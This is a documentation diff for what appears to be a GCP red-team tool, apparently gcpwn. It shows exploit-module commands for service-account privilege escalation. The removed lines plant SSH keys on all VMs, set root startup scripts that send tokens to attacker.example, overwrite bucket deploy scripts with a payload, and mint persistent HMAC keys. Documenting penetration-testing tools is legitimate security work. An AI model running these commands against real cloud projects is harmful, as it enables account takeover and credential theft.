@@ -345,7 +345,6 @@ The service makes API calls authenticated as the target SA — you control what 
 modules run exploit_cloudscheduler_job \
   --target-sa TARGET_SA_EMAIL \
   --action make-admin \
-  --read-response \
   --cleanup
 
 # Create a Cloud Tasks HTTP task authenticated as a target SA
@@ -353,11 +352,8 @@ modules run exploit_cloudscheduler_job \
 modules run exploit_cloudtasks_task_as_sa \
   --target-sa TARGET_SA_EMAIL \
   --action make-admin \
-  --read-response \
   --cleanup
 ```
-
-> **Note:** Response bodies are never returned by Cloud Scheduler or Cloud Tasks. Only side-effect mutations (IAM grants, key enables, etc.) are viable. To receive a token, use [OIDC Access](#exploit-module-tldr-oidc-access) paths below.
 
 #### Getting an OAuth2 Token Directly
 
@@ -409,57 +405,6 @@ modules run exploit_apigateway_as_sa_oidc \
   --oidc-token eyJhbGciOiJSUzI1NiJ9... \
   --wif-provider projects/PROJECT_NUMBER/locations/global/workloadIdentityPools/POOL_ID/providers/PROVIDER_ID \
   --save-as-cred wif-access-token
-```
-
-### Notable Single Permissions
-
-These permissions provide direct infrastructure write access — SSH keys or startup scripts — without `iam.serviceAccounts.actAs`.
-
-```bash
-# Add an SSH public key to project metadata — grants shell access to ALL VMs
-# (requires compute.projects.setCommonInstanceMetadata)
-modules run exploit_instance_ssh_keys \
-  --project-level \
-  --ssh-key-file ~/.ssh/id_ed25519.pub \
-  --username attacker
-
-# Add an SSH public key to a single instance
-# (requires compute.instances.setMetadata)
-modules run exploit_instance_ssh_keys \
-  --instance-level \
-  --instance-name projects/PROJECT_ID/zones/us-central1-a/instances/web-server \
-  --ssh-key-file ~/.ssh/id_ed25519.pub \
-  --username attacker
-
-# Set a startup script on an existing instance via stop/start;
-# script runs as root and can exfil the attached SA's OAuth2 token
-# (requires compute.instances.stop + .start + .setMetadata)
-modules run exploit_instance_startup_script \
-  --update-via-shutdown \
-  --instance-name projects/PROJECT_ID/zones/us-central1-a/instances/batch-runner \
-  --external-url https://attacker.example/collect
-```
-
-### Data Access Permissions
-
-These modules exploit write access to GCS or the ability to create persistent HMAC credentials that survive IAM changes.
-
-```bash
-# Overwrite a GCS object (e.g. a deploy script, config file)
-# (requires storage.objects.create on the target bucket)
-modules run exploit_bucket_upload \
-  --bucket victim-configs \
-  --remote-blob-path deploy/deploy.sh \
-  --local-blob-path ./payload.sh
-
-# Create an HMAC key tied to a target SA — long-lived, S3-compatible,
-# survives IAM policy changes and SA key rotations
-# (requires storage.hmacKeys.create; SA needs storage.*.list/get to enumerate)
-modules run exploit_storage_hmac \
-  --sa-email TARGET_SA_EMAIL \
-  --buckets \
-  --blobs \
-  --download
 ```
 
 See the [Exploit Module Reference](https://github.com/NetSPI/gcpwn/wiki/Exploit-Module-Reference) for the full flag reference, native `gcloud` equivalents, example scenarios, and the complete table of released and coming-soon modules.
